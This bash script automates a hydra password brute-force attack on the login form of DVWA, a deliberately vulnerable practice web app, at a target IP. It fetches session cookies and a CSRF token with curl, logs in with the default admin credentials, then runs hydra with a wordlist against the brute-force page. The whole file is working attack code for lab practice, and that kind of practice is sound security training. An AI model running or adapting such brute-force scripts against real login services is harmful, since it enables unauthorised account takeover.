#!/bin/bash
if [ "$1" == "" ] || [ $# -gt 1 ]; then
    echo "Enter the IP of the Vulnerable Server in quotes"
    exit 1
fi

targetIP=$1
PHPSessionLine=$(curl --no-progress-meter  -c - http://$targetIP/DVWA/vulnerabilities/brute/ | \
     grep PHPSESSID | sed -n 's/.*PHPSESSID\s*\(.*\)/\1/p')
echo $PHPSessionLine
hydra1="$targetIP -l admin -P /usr/share/set/src/fasttrack/wordlist.txt $targetIP"

hydra2='http-get-form "dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login='
hydra3="Login:Username and/or password incorrect.:H=Cookie: security=Low;PHPSESSID=$PHPSessionLine\""
#echo "hydra $hydra1 $hydra2$hydra3"

# https://blog.g0tmi1k.com/dvwa/bruteforce-low/ -- Sourced next 6 lines
CSRF=$(curl -s -c dvwa.cookie "$targetIP/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "$targetIP/DVWA/login.php"

hydra  -l admin  -P /usr/share/set/src/fasttrack/wordlist.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  $targetIP  http-get-form \
  "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
